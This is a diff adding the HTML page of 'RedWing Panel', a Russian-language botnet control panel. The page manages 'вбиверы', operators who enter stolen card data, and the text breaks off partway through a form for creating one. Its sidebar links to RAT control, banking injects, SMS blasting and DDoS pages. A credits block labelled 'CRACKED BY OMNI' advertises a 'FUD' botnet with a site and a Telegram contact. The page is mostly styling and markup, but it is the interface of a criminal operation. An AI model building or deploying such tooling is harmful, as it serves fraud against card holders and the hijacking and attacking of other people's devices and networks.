@@ -1,0 +1,1689 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RedWing Panel - Вбиверы</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script src="/theme.js?v=2"></script>
+    <style>
+        :root {
+            --bg-dark: #080809;
+            --bg-card: #0f0f12;
+            --bg-card-hover: #151518;
+            --border-color: #1a1a1f;
+            --red-primary: #dc3545;
+            --red-dark: #a71d2a;
+            --red-glow: rgba(220, 53, 69, 0.25);
+            --text-white: #e8e8e8;
+            --text-gray: #707078;
+            --text-dim: #404048;
+            --accent-green: #20c997;
+            --accent-yellow: #ffc107;
+            --accent-blue: #4dabf7;
+            --accent-orange: #fd7e14;
+            --accent-purple: #9775fa;
+            --scrollbar-thumb: #1a1a1f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Exo 2', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-white);
+            min-height: 100vh;
+            overflow-y: scroll;
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: var(--scrollbar-thumb); border-radius: 3px; }
+
+        .mono { font-family: 'JetBrains Mono', monospace; }
+
+        
+        .app-container {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        
+        .sidebar {
+            width: var(--sidebar-width, 260px);
+            background: var(--sidebar-bg, #0b0b0e);
+            border-right: 1px solid var(--border-color);
+            position: fixed;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            display: flex;
+            flex-direction: column;
+            z-index: 100;
+        }
+
+        
+        .sidebar-logo {
+            padding: 20px 16px 16px;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-svg-container {
+            width: 160px;
+            height: 108px;
+            position: relative;
+        }
+
+        .logo-svg-container svg {
+            width: 100%;
+            height: 100%;
+            transform: scaleY(-1);
+            filter: drop-shadow(0 0 20px var(--red-glow));
+        }
+
+        
+        .wing-left {
+            transform-origin: 75% 50%;
+            animation: wingFlapLeft 2.5s ease-in-out infinite;
+        }
+
+        .wing-right {
+            transform-origin: 25% 50%;
+            animation: wingFlapRight 2.5s ease-in-out infinite;
+        }
+
+        @keyframes wingFlapLeft {
+            0%, 100% { transform: rotate(0deg) translateY(0); }
+            50% { transform: rotate(-3deg) translateY(-2px); }
+        }
+
+        @keyframes wingFlapRight {
+            0%, 100% { transform: rotate(0deg) translateY(0); }
+            50% { transform: rotate(3deg) translateY(-2px); }
+        }
+
+        
+        .logo-glow {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            width: 200px;
+            height: 140px;
+            background: radial-gradient(ellipse, rgba(230, 57, 70, 0.45) 0%, transparent 60%);
+            transform: translate(-50%, -50%);
+            z-index: 0;
+            animation: logoGlowPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes logoGlowPulse {
+            0%, 100% { opacity: 0.6; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.15); }
+        }
+
+        
+        .logo-fog {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(ellipse at 50% 30%, rgba(230, 57, 70, 0.12) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        
+        .logo-particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        
+        .logo-separator {
+            width: 50%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--red-primary), transparent);
+            opacity: 0.4;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-name {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--red-primary);
+            letter-spacing: 4px;
+            text-shadow: 0 0 20px var(--red-glow), 0 0 40px var(--red-glow);
+        }
+
+        .logo-subtitle {
+            font-size: 0.6rem;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 2px;
+        }
+
+        
+        .sidebar-nav {
+            flex: 1;
+            padding: 20px 12px;
+            overflow-y: auto;
+        }
+
+        .nav-section {
+            margin-bottom: 24px;
+        }
+
+        .nav-section-title {
+            font-size: 0.65rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            padding: 0 12px;
+            margin-bottom: 8px;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            border-radius: 6px;
+            color: var(--text-gray);
+            cursor: pointer;
+            transition: all 0.15s ease;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin-bottom: 2px;
+        }
+
+        .nav-item:hover {
+            background: var(--bg-card-hover);
+            color: var(--text-white);
+        }
+
+        .nav-item.active {
+            background: var(--red-primary);
+            color: white;
+            border-radius: 4px;
+        }
+
+        .nav-item-icon {
+            width: 20px;
+            height: 20px;
+            stroke-width: 2;
+        }
+
+        .nav-item-icon svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .nav-item-text {
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .nav-item-badge {
+            margin-left: auto;
+            background: var(--red-primary);
+            color: white;
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 600;
+        }
+
+        
+        .sidebar-user {
+            padding: 16px 20px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 6px;
+            background: var(--red-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .user-info {
+            flex: 1;
+        }
+
+        .user-name {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-white);
+        }
+
+        .user-role {
+            font-size: 0.7rem;
+            color: var(--text-dim);
+        }
+
+        .user-logout {
+            color: var(--text-dim);
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .user-logout:hover {
+            color: var(--red-primary);
+        }
+
+        
+        .main-content {
+            flex: 1;
+            margin-left: var(--sidebar-width, 260px);
+            min-height: 100vh;
+        }
+
+        .header {
+            height: 60px;
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            position: fixed;
+            top: 0;
+            left: var(--sidebar-width, 260px);
+            right: 0;
+            z-index: 99;
+        }
+
+        .header h1 {
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .workers-content {
+            padding: 84px 24px 24px;
+        }
+
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .btn-primary {
+            background: var(--red-primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--red-dark);
+        }
+
+        .btn-secondary {
+            background: var(--bg-dark);
+            border: 1px solid var(--border-color);
+            color: var(--text-gray);
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--text-dim);
+            color: var(--text-white);
+        }
+
+        .btn-danger {
+            background: transparent;
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: var(--red-primary);
+        }
+
+        .btn-danger:hover {
+            background: rgba(220, 53, 69, 0.15);
+            border-color: var(--red-primary);
+        }
+
+        
+        .workers-table {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .table-header {
+            display: grid;
+            grid-template-columns: 40px 1fr 120px 100px;
+            gap: 16px;
+            padding: 14px 20px;
+            background: var(--bg-dark);
+            border-bottom: 1px solid var(--border-color);
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .worker-row {
+            display: grid;
+            grid-template-columns: 40px 1fr 120px 100px;
+            gap: 16px;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border-color);
+            align-items: center;
+            transition: background 0.2s;
+        }
+
+        .worker-row:last-child {
+            border-bottom: none;
+        }
+
+        .worker-row:hover {
+            background: var(--bg-card-hover);
+        }
+
+        .worker-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 4px;
+            background: var(--accent-purple);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 0.8rem;
+        }
+
+        .worker-info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .worker-name {
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .worker-login {
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .worker-date {
+            font-size: 0.75rem;
+            color: var(--text-dim);
+        }
+
+        .worker-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .action-btn {
+            width: 32px;
+            height: 32px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            background: var(--bg-dark);
+            color: var(--text-dim);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .action-btn svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .action-btn:hover {
+            border-color: var(--text-gray);
+            color: var(--text-white);
+        }
+
+        .action-btn.danger:hover {
+            border-color: var(--red-primary);
+            color: var(--red-primary);
+            background: rgba(220, 53, 69, 0.1);
+        }
+
+        
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-dim);
+        }
+
+        .empty-state svg {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+            opacity: 0.3;
+        }
+
+        .empty-state h3 {
+            font-size: 1rem;
+            color: var(--text-gray);
+            margin-bottom: 8px;
+        }
+
+        .empty-state p {
+            font-size: 0.8rem;
+        }
+
+        
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 450px;
+            transform: translateY(-20px);
+            transition: transform 0.3s;
+        }
+
+        .modal-overlay.show .modal {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .modal-header h2 {
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .modal-close:hover {
+            color: var(--text-white);
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            background: var(--bg-dark);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 10px 14px;
+            color: var(--text-white);
+            font-size: 0.85rem;
+            font-family: 'JetBrains Mono', monospace;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--red-primary);
+        }
+
+        .form-hint {
+            font-size: 0.65rem;
+            color: var(--text-dim);
+            margin-top: 4px;
+        }
+
+        .modal-footer {
+            padding: 16px 20px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        
+        .credentials-box {
+            background: var(--bg-dark);
+            border: 1px solid var(--accent-green);
+            border-radius: 4px;
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        .credentials-box h4 {
+            font-size: 0.75rem;
+            color: var(--accent-green);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .credentials-box h4 svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .credential-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .credential-item:last-child {
+            border-bottom: none;
+        }
+
+        .credential-label {
+            font-size: 0.7rem;
+            color: var(--text-dim);
+        }
+
+        .credential-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text-white);
+        }
+
+        .copy-btn {
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            cursor: pointer;
+            padding: 4px;
+            margin-left: 8px;
+        }
+
+        .copy-btn:hover {
+            color: var(--accent-green);
+        }
+
+        
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 1000;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .toast.success { border-color: var(--accent-green); }
+        .toast.error { border-color: var(--red-primary); }
+
+        .toast svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .toast.success svg { color: var(--accent-green); }
+        .toast.error svg { color: var(--red-primary); }
+
+        /* ========== MOBILE RESPONSIVE ========== */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--text-white);
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        .mobile-menu-btn svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .sidebar-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 99;
+        }
+
+        .sidebar-overlay.show {
+            display: block;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+                transition: transform 0.3s ease;
+            }
+
+            .sidebar.open {
+                transform: translateX(0);
+            }
+
+            .main-content {
+                margin-left: 0;
+            }
+
+            .header {
+                left: 0;
+                padding: 0 16px;
+            }
+
+            .header h1 {
+                font-size: 1rem;
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .workers-content {
+                padding: 74px 12px 12px;
+            }
+
+            .workers-table {
+                overflow-x: auto;
+            }
+
+            .table-header {
+                display: none;
+            }
+
+            .worker-row {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 12px;
+                padding: 14px;
+            }
+
+            .worker-avatar {
+                width: 40px;
+                height: 40px;
+            }
+
+            .worker-info {
+                flex: 1;
+                min-width: 120px;
+            }
+
+            .worker-date {
+                width: 100%;
+                order: 3;
+                padding-top: 8px;
+                border-top: 1px solid var(--border-color);
+                margin-top: 4px;
+            }
+
+            .worker-actions {
+                order: 2;
+            }
+
+            .btn {
+                padding: 8px 14px;
+                font-size: 0.75rem;
+            }
+
+            .modal {
+                margin: 16px;
+                max-width: calc(100% - 32px);
+            }
+
+            .modal-header h2 {
+                font-size: 0.9rem;
+            }
+
+            .form-input {
+                font-size: 16px; /* Prevents zoom on iOS */
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-actions .btn span {
+                display: none;
+            }
+
+            .header-actions .btn {
+                padding: 10px;
+            }
+
+            .worker-actions {
+                flex-direction: column;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="/sidebar.css?v=6">
+<script src="/guard.js"></script></head>
+<body>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+    <div class="app-container">
+        
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-logo">
+                <div class="logo-fog"></div>
+                <div class="logo-glow"></div>
+                <canvas class="logo-particles" id="logoParticles"></canvas>
+                <div class="logo-wrapper">
+                    <div class="logo-svg-container">
+                        <svg viewBox="0 0 1024 687" xmlns="http://www.w3.org/2000/svg">
+                            
+                            <g class="wing-left">
+                                <path fill="var(--red-primary)" d="M281 557.4 c0 -0.4 1.5 -3.7 16 -34.4 16.5 -34.9 23 -48.6 24.2 -50.9 1 -1.9 8 -5 35.3 -15.8 18.7 -7.4 36.8 -14.6 40.3 -16.1 5.9 -2.5 7.8 -4.2 4.8 -4.2 -1.2 0 -27.7 -7.8 -32.6 -9.6 -1.5 -0.6 2.7 -2.1 34.9 -11.8 10.2 -3.1 18.6 -5.8 18.8 -6 0.2 -0.2 -2.5 -4.8 -5.9 -10.2 -3.5 -5.5 -6.7 -10.4 -7.1 -11 -0.6 -1.1 4.5 -0.1 24.8 4.6 20.5 4.7 18.2 4.6 30.9 1.8 l11.6 -2.5 1.1 4.1 c2.8 10.9 5.2 17.2 7.1 19.3 l2.1 2.2 -5.5 6.8 c-14.2 17.7 -16.5 24.6 -12.8 38.7 1.1 4.4 1.9 8.1 1.7 8.2 -0.4 0.4 -15.7 7.5 -44.7 20.8 -14 6.5 -27.8 12.8 -30.6 14.2 -5.6 2.7 -37.7 17.3 -52.4 23.9 -5.2 2.3 -12.9 5.8 -17 7.8 -19.5 9.2 -45 20.6 -45 20.1z"/>
+                            </g>
+                            
+                            <path fill="var(--bg-card)" stroke="var(--red-primary)" stroke-width="2" stroke-opacity="0.3" d="M501.4 539.4 c-0.7 -10.1 -1.4 -14.8 -2.3 -15.3 -0.7 -0.5 -4.6 -1.4 -8.7 -2.1 -4.1 -0.7 -7.4 -1.6 -7.4 -1.9 0 -0.3 3.9 -1.5 8.8 -2.6 l8.7 -2 1.2 -17 c0.6 -9.4 1.9 -27.1 2.8 -39.5 1.6 -20.9 1.6 -22.8 0.1 -25.7 -0.9 -1.8 -1.6 -4.6 -1.6 -6.2 0 -2 -1 -4.1 -3.2 -6.3 -11.5 -11.8 -11.7 -12.1 -14.2 -21.1 l-2.4 -8.7 6.4 -4.6 6.4 -4.6 0 -18.3 0 -18.3 -5.7 -5.6 -5.8 -5.6 -7.7 0 c-6.4 0 -7.7 -0.3 -8.1 -1.7 -0.3 -1 -1.3 -4.9 -2.2 -8.8 -1.5 -6.5 -2 -7.3 -7.5 -12 -3.2 -2.7 -5.9 -5.5 -5.9 -6.2 -0.1 -1.8 6 -17.6 7.4 -19.1 0.6 -0.7 3.3 -1.5 6 -1.6 3.8 -0.3 5.2 -0.9 7.1 -3.2 1.3 -1.6 2.3 -3.4 2.4 -4 0 -0.6 -5.5 -2.7 -12.2 -4.8 -6.7 -2 -13.1 -4.4 -14.2 -5.4 -1.2 -1 -4.1 -3.1 -6.6 -4.8 -13.8 -9.5 -32.1 -22 -36.3 -24.7 -4.5 -3 -5.4 -4.4 -14.9 -23.2 -5.5 -11 -10.4 -20.4 -10.9 -21 -4 -4.3 4.9 -3.3 15.1 1.7 8.2 4 16.8 12.5 20.9 20.6 1.7 3.4 3.3 6.2 3.5 6.2 1.1 0 -1.9 -9.4 -5 -15.9 -4.2 -8.6 -13.2 -18.1 -21 -22.3 -20.7 -11.1 -47.2 -5.6 -60.9 12.7 -4.9 6.5 -7.3 12.3 -9.1 21.5 -5.7 29 15.6 60 46.2 67.4 l5.9 1.4 -4.5 0.1 c-11.4 0.2 -26.9 -5.5 -37.5 -13.6 -13.2 -10.2 -23.7 -26.5 -27 -41.9 -1.9 -9 -1.9 -21.5 0 -28.9 6.4 -24.5 24.1 -41 49.4 -45.9 3.6 -0.7 5.9 -1.5 5.1 -1.8 -0.8 -0.4 -18.1 -4.3 -38.5 -8.7 -20.3 -4.5 -38.3 -8.5 -40 -9 -1.8 -0.6 36.2 -1 96.9 -1 l99.8 -0.1 5.3 -4.9 c6.3 -5.7 12.5 -8.8 21.4 -10.7 8.4 -1.7 12.1 -1.7 19.9 0.1 8.4 2 15.9 5.8 22 11.1 l5 4.4 86.6 0 c47.6 0 86.6 0.2 86.6 0.5 0 0.3 -3.9 8.8 -8.6 18.9 l-8.6 18.4 -8.7 1.2 c-4.7 0.6 -10.8 1.4 -13.5 1.8 l-4.9 0.7 -13.3 28.3 c-7.2 15.5 -14.1 30.5 -15.3 33.2 l-2.2 5 -16.4 0 c-11.9 0 -16.7 0.3 -17.5 1.3 -0.6 0.6 -4 6.6 -7.4 13.2 l-6.3 12 -22 8.8 -22 8.8 -1.7 6 c-0.9 3.3 -1.4 6.4 -1.1 6.9 0.3 0.5 2.8 2.2 5.5 3.7 2.8 1.5 5 3.2 5 3.7 0 0.5 -1.9 3 -4.2 5.6 -9.6 10.5 -20.8 23.9 -20.8 24.9 0 0.6 3.9 7.4 8.6 15.2 l8.6 14.1 -3.9 9.1 c-4.2 9.9 -4 9.8 -11.7 8.3 l-3.8 -0.7 0.4 6.6 0.4 6.6 -5.3 5 -5.3 5 -4.6 -3.7 c-5.4 -4.5 -6.4 -6.1 -6.4 -10.8 0 -3.3 -1.2 -4.7 -2.4 -2.8 -0.2 0.4 -1 7.3 -1.6 15.2 -0.8 10.3 -0.8 14.6 -0.1 14.8 1.7 0.6 1.3 10.3 -0.4 12.2 -1.1 1.2 -1.8 6.2 -2.5 19.6 -0.6 9.8 -1.7 28 -2.5 40.3 -0.9 12.3 -1.3 22.7 -0.9 23 0.3 0.3 4.6 1.8 9.6 3.2 l9.1 2.6 -7.9 1.2 c-13.4 2.1 -11.9 0.4 -14.9 16.4 -1.5 7.8 -2.8 14.3 -3 14.5 -0.1 0.1 -0.6 -6.3 -1.1 -14.4z m13.9 -191 c4.4 -2.3 4.7 -3 4.7 -10.4 0 -5.9 1.8 -33 5.4 -82.3 1.4 -18.4 1.4 -19 -0.6 -23.5 l-2 -4.7 -2.3 4.6 c-2 3.9 -2.5 7 -3.4 22 -0.6 9.5 -1.8 27.3 -2.6 39.4 -4 60.6 -3.8 56.5 -3 56.5 0.4 0 2 -0.7 3.8 -1.6z m31.5 -150.2 c8.5 -8.6 13.2 -23.1 11.3 -35.1 -1.9 -12 -10.5 -24.2 -20.3 -28.9 -8.1 -4 -16.3 -5.5 -23 -4.3 -19.1 3.3 -31.8 17.2 -32.7 35.5 -0.3 7.5 1.2 18 2.7 19 0.4 0.2 0.7 -3.5 0.7 -8.2 0.1 -7.4 0.5 -9.5 2.7 -13.8 6 -11.4 16.2 -17.8 28.8 -17.8 6.1 0.1 8.6 0.6 13.2 2.8 20.4 9.7 25.4 38.4 9.5 53.9 l-5.1 4.9 4.3 -2.1 c2.3 -1.2 5.9 -3.9 7.9 -5.9z"/>
+                            
+                            
+                            <g class="wing-right">
+                                <path fill="var(--red-primary)" d="M756 483.5 c-4.7 -1.3 -20.2 -5.5 -34.5 -9.3 -58.3 -15.7 -97.5 -26.3 -106 -28.7 -4.9 -1.3 -13 -3.5 -18 -4.8 -8.3 -2.3 -9 -2.6 -8.7 -4.8 0.1 -1.3 0.3 -5.3 0.5 -8.9 0.1 -5.7 -0.2 -7.3 -3.3 -12.9 -2.3 -4.2 -5.6 -8.2 -9.9 -12 -3.6 -3.1 -8.9 -7.8 -11.7 -10.4 l-5.2 -4.8 4.1 -9.1 4.1 -9.1 -2.6 -4.7 -2.7 -4.8 10.7 -0.4 10.7 -0.4 8.5 -5.4 c14.8 -9.4 20.2 -12.2 19.6 -10.2 -2.2 7.4 -5.1 23.2 -4.2 23.2 0.9 0 45.8 5.7 52.5 6.7 l5.4 0.8 -15.1 7.9 c-8.4 4.4 -15.2 8.2 -15.2 8.6 0 0.3 10.2 2.9 22.8 5.9 12.5 2.9 30 7 38.9 9.2 9 2.1 16.8 3.9 17.5 3.9 0.7 0 9.9 12.7 20.3 28.2 27 40 32.6 48.8 31.2 48.7 -0.6 -0.1 -5 -1.2 -9.7 -2.4z"/>
+                            </g>
+                        </svg>
+                    </div>
+                    <div class="logo-separator"></div>
+                    <div class="logo-text">
+                        <div class="logo-name">RedWing</div>
+                        <div class="logo-subtitle">Control Panel</div>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="sidebar-nav">
+                <div class="nav-section">
+                    <div class="nav-section-title" data-i18n="nav_main">Основное</div>
+                    <a href="dashboard.html" class="nav-item">
+                        <i data-feather="bar-chart-2" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_dashboard">Дашборд</span>
+                    </a>
+                    <a href="devices.html" class="nav-item">
+                        <i data-feather="smartphone" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_devices">Устройства</span>
+                    </a>
+                </div>
+
+                <div class="nav-section">
+                    <div class="nav-section-title" data-i18n="nav_management">Управление</div>
+                    <a href="vnc.html" class="nav-item" id="rat-nav-item">
+                        <i data-feather="monitor" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_rat">RAT Управление</span>
+                    </a>
+                    <a href="injects.html" class="nav-item">
+                        <i data-feather="crosshair" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_injects">Инжекты</span>
+                    </a>
+                    <a href="blast.html" class="nav-item">
+                        <i data-feather="send" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_blast">SMS Рассылка</span>
+                    </a>
+                    <a href="ddos.html" class="nav-item">
+                        <i data-feather="zap" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_ddos">DDoS</span>
+                    </a>
+                </div>
+
+                <div class="nav-section" id="nav-section-settings">
+                    <div class="nav-section-title" data-i18n="nav_settings_section">Настройки</div>
+                    <a href="workers.html" class="nav-item active" id="workers-nav-item">
+                        <i data-feather="users" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_workers">Вбиверы</span>
+                    </a>
+                    <a href="settings.html" class="nav-item" id="settings-nav-item">
+                        <i data-feather="settings" class="nav-item-icon"></i>
+                        <span class="nav-item-text" data-i18n="nav_settings">Настройки</span>
+                    </a>
+                </div>
+            </nav>
+
+            <div class="sidebar-credits" style="border-top:1px solid rgba(220,38,38,.15);padding:14px 16px;">
+                <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#ef4444;font-weight:700;margin-bottom:6px;">CRACKED BY OMNI</div>
+                <div data-i18n="crack_sidebar" style="font-size:11px;color:rgba(255,255,255,.4);line-height:1.5;margin-bottom:8px;">Кроссплатформенный ботнет<br>с гарантией FUD</div>
+                <a href="https://omni.lc/" target="_blank" style="display:block;padding:6px 12px;background:#ef4444;border-radius:8px;color:#fff;font-size:11px;font-weight:600;text-align:center;text-decoration:none;margin-bottom:6px;">omni.lc</a>
+                <a href="https://t.me/omnibotnet" target="_blank" style="display:block;font-size:11px;color:rgba(255,255,255,.35);text-align:center;text-decoration:none;">Telegram: @omnibotnet</a>
+            </div>
+
+            <div class="sidebar-user">
+                <div class="user-avatar" id="userAvatar">R</div>
+                <div class="user-info">
+                    <div class="user-name" id="userName">RedWing</div>
+                    <div class="user-role" id="userRole" data-i18n="role_ts">ТС • Полный доступ</div>
+                </div>
+                <div class="user-logout" data-i18n-title="logout" title="Выйти"><i data-feather="log-out"></i></div>
+            </div>
+        </aside>
+
+        
+        <main class="main-content">
+            <header class="header">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <button class="mobile-menu-btn" onclick="toggleSidebar()">
+                        <i data-feather="menu"></i>
+                    </button>
+                    <h1 data-i18n="page_title">Управление вбиверами</h1>
+                </div>
+                <div class="header-actions">
+                    <button id="langToggleBtn" onclick="toggleLang()" style="background:var(--bg-card);border:1px solid var(--border-color);color:var(--text-secondary);padding:4px 10px;border-radius:6px;cursor:pointer;font-size:.8rem;font-weight:600;">RU</button>
+                    <button class="btn btn-primary" onclick="showCreateModal()">
+                        <i data-feather="plus"></i>
+                        <span data-i18n="btn_create_worker">Создать вбивера</span>
+                    </button>
+                </div>
+            </header>
+
+            <div class="workers-content">
+                <div class="workers-table">
+                    <div class="table-header">
+                        <div></div>
+                        <div data-i18n="th_name_login">Имя / Логин</div>
+                        <div data-i18n="th_created">Создан</div>
+                        <div data-i18n="th_actions">Действия</div>
+                    </div>
+                    <div id="workersContainer">
+                        
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    
+    <div class="modal-overlay" id="createModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 data-i18n="modal_create_title">Создать вбивера</h2>
+                <button class="modal-close" onclick="hideCreateModal()">
+                    <i data-feather="x"></i>
+                </button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_worker_name">Имя вбивера</label>
+                    <input type="text" class="form-input" id="workerName" data-i18n="ph_worker_name" placeholder="Например: Иван">
+                    <div class="form-hint" data-i18n="hint_display_name">Отображаемое имя в панели</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_login">Логин для входа</label>
+                    <input type="text" class="form-input" id="workerLogin" data-i18n="ph_login" placeholder="Например: worker1">
